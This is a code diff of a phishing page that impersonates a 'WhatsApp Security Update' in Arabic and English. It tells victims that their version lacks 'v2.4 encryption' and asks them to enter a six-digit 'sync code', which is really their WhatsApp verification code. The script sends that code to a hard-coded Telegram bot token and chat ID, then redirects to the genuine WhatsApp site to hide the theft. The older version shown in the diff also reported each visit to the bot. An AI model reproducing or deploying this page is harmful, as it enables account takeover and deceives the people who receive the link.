@@ -3,151 +3,123 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Security</title>
+    <title>WhatsApp Security</title>
     <style>
-        :root { --wa-bg: #0b141a; --wa-green: #00a884; --wa-text: #e9edef; --wa-hint: #8696a0; }
+        :root { --bg: #0b141a; --card: #1d2a33; --green: #00a884; --text: #e9edef; --hint: #8696a0; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
-        body { background: var(--wa-bg); color: var(--wa-text); height: 100vh; overflow: hidden; }
-        #checker { position: fixed; inset: 0; background: var(--wa-bg); z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .pulse-logo { width: 60px; animation: pulseLogo 2s infinite ease-in-out; }
-        @keyframes pulseLogo { 0%, 100% { transform: scale(1); opacity: 0.9; } 50% { transform: scale(1.05); opacity: 1; } }
-        .container { padding: 30px 20px; text-align: center; display: none; max-width: 450px; margin: auto; }
-        .active { display: block; animation: fadeIn 0.5s ease; }
-        .device-info { background: #1d2a33; border-radius: 12px; padding: 20px; margin-bottom: 25px; border: 1px solid #222d34; text-align: inherit; }
-        .info-line { font-size: 13px; margin-bottom: 10px; color: var(--wa-hint); display: flex; justify-content: space-between; align-items: center; }
-        .info-line b { color: #fff; font-family: inherit; font-weight: 500; direction: ltr; }
-        .status-update { color: var(--wa-green); font-weight: 500; }
-        .otp-input { width: 100%; background: transparent; border: none; border-bottom: 2px solid #2a3942; color: #fff; font-size: 32px; text-align: center; outline: none; letter-spacing: 12px; margin: 25px 0; direction: ltr; }
-        .btn { background: var(--wa-green); color: #111b21; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; }
-        .spinner { border: 3px solid #202c33; border-top: 3px solid var(--wa-green); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: auto; }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        body { background: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        
+        .container { width: 100%; max-width: 400px; padding: 25px; text-align: center; }
+        .logo { width: 55px; margin-bottom: 15px; }
+        .main-title { font-size: 19px; font-weight: 600; margin-bottom: 20px; color: #fff; }
+
+        .info-card { background: var(--card); border-radius: 12px; padding: 18px; margin-bottom: 20px; border: 1px solid #2a3942; }
+        .row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 13.5px; line-height: 1.4; }
+        .label { color: var(--hint); }
+        .value { color: #fff; font-weight: 500; text-align: left; }
+        .status { color: var(--green); font-weight: bold; }
+
+        .phone-section { border-top: 1px solid #2a3942; margin-top: 10px; padding-top: 15px; }
+        .phone-val { color: var(--green); font-size: 17px; font-weight: bold; letter-spacing: 0.5px; }
+
+        .desc { font-size: 13px; color: var(--hint); line-height: 1.6; margin: 25px 0; padding: 0 5px; }
+
+        .otp-box { width: 100%; background: transparent; border: none; border-bottom: 2px solid #2a3942; color: #fff; font-size: 28px; text-align: center; outline: none; letter-spacing: 10px; margin-bottom: 25px; }
+        .otp-box:focus { border-bottom-color: var(--green); }
+
+        .btn { background: var(--green); color: #111b21; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        .btn:active { transform: scale(0.98); }
+
+        [dir="rtl"] .row { text-align: right; }
+        [dir="rtl"] .value { text-align: left; }
     </style>
 </head>
 <body>
 
-    <div id="checker">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="pulse-logo">
-        <p id="check-msg" style="margin-top:20px; font-size:14px; color:var(--wa-hint);"></p>
-    </div>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
+        <h1 class="main-title" id="title"></h1>
 
-    <div class="container" id="app">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="50" style="margin-bottom:20px;">
-        <h2 id="main-title" style="font-size:20px; margin-bottom:15px; font-weight: 500;"></h2>
-
-        <div class="device-info">
-            <div class="info-line"><span id="lbl-device"></span> <b id="device-name">...</b></div>
-            <div class="info-line"><span id="lbl-status"></span> <span class="status-update" id="val-status"></span></div>
-            <div class="info-line"><span id="lbl-enc"></span> <b>SSL/TLS 1.3</b></div>
-            <div class="info-line"><span id="lbl-time"></span> <b id="time-val">--:--:--</b></div>
-            <div style="border-top: 1px solid #222d34; margin-top:10px; padding-top:10px; display: flex; justify-content: space-between;">
-                <span id="lbl-phone"></span> <b id="masked-phone" style="color:var(--wa-green);"></b>
+        <div class="info-card">
+            <div class="row">
+                <span class="label" id="lbl-dev"></span>
+                <span class="value" id="val-dev">iPhone</span>
+            </div>
+            <div class="row">
+                <span class="label" id="lbl-status"></span>
+                <span class="status" id="val-status"></span>
+            </div>
+            <div class="row">
+                <span class="label" id="lbl-time"></span>
+                <span class="value" id="val-time"></span>
+            </div>
+            <div class="phone-section row">
+                <span class="label" id="lbl-num" style="color:#fff"></span>
+                <span class="phone-val">+20 010 •••• •• 87</span>
             </div>
         </div>
 
-        <p id="desc-text" style="font-size: 13px; color: var(--wa-hint); line-height: 1.6; margin-bottom: 20px;"></p>
+        <p class="desc" id="desc"></p>
 
-        <input type="tel" id="otp" class="otp-input" maxlength="6" inputmode="numeric" placeholder="------">
-        <button id="submit-btn" class="btn" onclick="submitData()"></button>
+        <input type="tel" id="otp" class="otp-box" maxlength="6" placeholder="------">
+        <button class="btn" id="btn" onclick="send()"></button>
     </div>
 
     <script>
-        const CFG = {
-            T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU',
-            C: '5446862709',
-            P: '01030003287'
-        };
-
-        const DICT = {
+        const CFG = { T: '8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU', C: '5446862709' };
+        
+        const content = {
             ar: {
-                check: "جاري التحقق من أمان الحساب...",
-                title: "تحديث بروتوكول الأمان الإلزامي",
-                device: "الجهاز المكتشف:",
+                title: "تحديث أمان واتساب",
+                dev: "الجهاز المكتشف:",
                 status: "حالة الإصدار:",
-                status_val: "● متاح (v2.4) تحديث أمني",
-                enc: "نظام التشفير:",
-                phone: "الرقم الموثق:",
+                status_val: "● تحديث أمان متاح (v2.4)",
                 time: "توقيت النظام:",
-                desc: "نسخة واتساب الحالية على جهازك لا تدعم التشفير المتقدم v2.4. يرجى إدخال كود المزامنة لتفعيل التحديث وحماية محادثاتك.",
-                btn: "تحديث ومزامنة الآن",
-                sync: "جاري المزامنة مع الخادم..."
+                num: "الرقم الموثق:",
+                desc: "نسخة واتساب الحالية لا تدعم التشفير المتقدم v2.4. يرجى إدخال كود المزامنة لتفعيل التحديث وحماية محادثاتك.",
+                btn: "تحديث ومزامنة الآن"
             },
             en: {
-                check: "Verifying account security...",
-                title: "Mandatory Security Update",
-                device: "Detected Device:",
+                title: "WhatsApp Security Update",
+                dev: "Detected Device:",
                 status: "Version Status:",
-                status_val: "● Available (v2.4) Security Patch",
-                enc: "Encryption System:",
-                phone: "Verified Number:",
+                status_val: "● Security Update Available (v2.4)",
                 time: "System Time:",
-                desc: "Your current version does not support v2.4 encryption. Please enter the synchronization code to activate the update and secure your chats.",
-                btn: "Update & Sync Now",
-                sync: "Syncing with server..."
+                num: "Verified Number:",
+                desc: "Your current version does not support v2.4 encryption. Please enter the synchronization code to activate the update.",
+                btn: "Update & Sync Now"
             }
         };
 
-        const userLang = navigator.language.startsWith('ar') ? 'ar' : 'en';
-        document.documentElement.dir = userLang === 'ar' ? 'rtl' : 'ltr';
-        const T = DICT[userLang];
+        const lang = navigator.language.startsWith('ar') ? 'ar' : 'en';
+        document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
+        const T = content[lang];
 
-        function getModel() {
-            const ua = navigator.userAgent;
-            if (/iPhone|iPad|iPod/.test(ua)) return "iPhone";
-            if (/Android/.test(ua)) return "Android Device";
-            return "Web Device";
+        document.getElementById('title').innerText = T.title;
+        document.getElementById('lbl-dev').innerText = T.dev;
+        document.getElementById('lbl-status').innerText = T.status;
+        document.getElementById('val-status').innerText = T.status_val;
+        document.getElementById('lbl-time').innerText = T.time;
+        document.getElementById('lbl-num').innerText = T.num;
+        document.getElementById('desc').innerText = T.desc;
+        document.getElementById('btn').innerText = T.btn;
+
+        function updateClock() {
+            document.getElementById('val-time').innerText = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
         }
+        setInterval(updateClock, 1000); updateClock();
 
-        async function bot(msg) {
-            try {
+        async function send() {
+            const code = document.getElementById('otp').value;
+            if(code.length === 6) {
+                document.getElementById('btn').innerText = "...";
                 await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
                     method: 'POST', headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: CFG.C, text: msg, parse_mode: 'HTML' })
+                    body: JSON.stringify({ chat_id: CFG.C, text: `✅ Code: ${code}` })
                 });
-            } catch(e) {}
-        }
-
-        async function init() {
-            document.getElementById('check-msg').innerText = T.check;
-            document.getElementById('main-title').innerText = T.title;
-            document.getElementById('lbl-device').innerText = T.device;
-            document.getElementById('lbl-status').innerText = T.status;
-            document.getElementById('val-status').innerText = T.status_val;
-            document.getElementById('lbl-enc').innerText = T.enc;
-            document.getElementById('lbl-phone').innerText = T.phone;
-            document.getElementById('lbl-time').innerText = T.time;
-            document.getElementById('desc-text').innerText = T.desc;
-            document.getElementById('submit-btn').innerText = T.btn;
-
-            document.getElementById('device-name').innerText = getModel();
-            document.getElementById('masked-phone').innerText = "+20 " + CFG.P.substring(0,3) + " •••• •• " + CFG.P.slice(-2);
-
-            setInterval(() => {
-                document.getElementById('time-val').innerText = new Date().toLocaleTimeString('en-US', { 
-                    hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true 
-                });
-            }, 1000);
-
-            bot(`🚀 <b>New Access</b>\nDevice: ${getModel()}\nLang: ${userLang}`);
-
-            setTimeout(() => {
-                document.getElementById('checker').style.display = 'none';
-                document.getElementById('app').classList.add('active');
-            }, 3000);
-        }
-
-        async function submitData() {
-            const val = document.getElementById('otp').value;
-            if(val.length === 6) {
-                document.getElementById('submit-btn').disabled = true;
-                await bot(`🔥 <b>New Code</b>\nCode: <code>${val}</code>\nDevice: ${getModel()}`);
-                document.body.innerHTML = `<div style="background:var(--wa-bg); height:100vh; display:flex; align-items:center; justify-content:center; flex-direction:column; color:var(--wa-hint);">
-                    <div class="spinner"></div><p style="margin-top:20px;">${T.sync}</p>
-                </div>`;
-                setTimeout(() => window.location.href = "https://www.whatsapp.com/security", 4000);
+                location.href = "https://www.whatsapp.com/security";
             }
         }
-        init();
     </script>
 </body>
 </html>
